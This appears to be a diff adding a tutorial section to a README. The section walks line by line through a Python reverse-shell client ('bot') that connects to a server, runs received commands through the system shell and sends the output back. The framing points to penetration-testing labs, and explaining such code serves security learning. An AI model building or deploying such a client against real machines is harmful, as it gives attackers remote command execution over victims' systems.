@@ -96,4 +96,19 @@ server = Server():
 This creates an instance of the Server class, initializing it with the default host and port.
 server.run():  
 
-This line calls the run method on the server instance. (Note: The run method needs to be defined in the Server class for this to work. It typically handles starting the server and accepting client connections.)
+This line calls the run method on the server instance. (Note: The run method needs to be defined in the Server class for this to work. It typically handles starting the server and accepting client connections.)  
+
+**How creating the client works**
+
+The client.py script outlines how a client (or "bot" in the context of a reverse shell) connects to the server and handles incoming commands.  
+
+def connect_to_server(host, port):: Defines a function that takes a host and port number to connect to the server.  
+with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:: Creates a socket object using IPv4 addressing (AF_INET) and TCP (SOCK_STREAM), ensuring it's automatically closed after exiting the with block.  
+sock.connect((host, port)): Initiates a connection to the server at the specified host and port.  
+while True:: Enters an infinite loop to continuously listen for commands from the server.  
+command = sock.recv(1024).decode('utf-8'): Waits to receive a command from the server, reading up to 1024 bytes. The received bytes are then decoded using UTF-8 to convert them back into a string.  
+result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE): Executes the received command using the system shell. stdout=subprocess.PIPE and stderr=subprocess.PIPE capture the command's standard output and standard error, respectively.  
+output = result.stdout.decode(sys.getfilesystemencoding()): Decodes the output of the command execution from bytes to a string using the file system's encoding, which ensures that characters specific to the system's file system are correctly interpreted.  
+sock.send(output.encode('utf-8')): Sends the command execution result back to the server, encoding it to UTF-8 to convert the string back to bytes suitable for network transmission.
+time.sleep(1): Pauses execution for 1 second before listening for the next command. This is typically used to prevent the client from overwhelming the network or the server with rapid, continuous requests.  
+This client script effectively transforms the machine it runs on into a "bot" that connects to a specified server, awaits commands, executes them, and returns the results. This setup is typical for controlled environments in cybersecurity practice, such as penetration testing labs, where researchers simulate attacks and defenses to better understand and improve security measures.
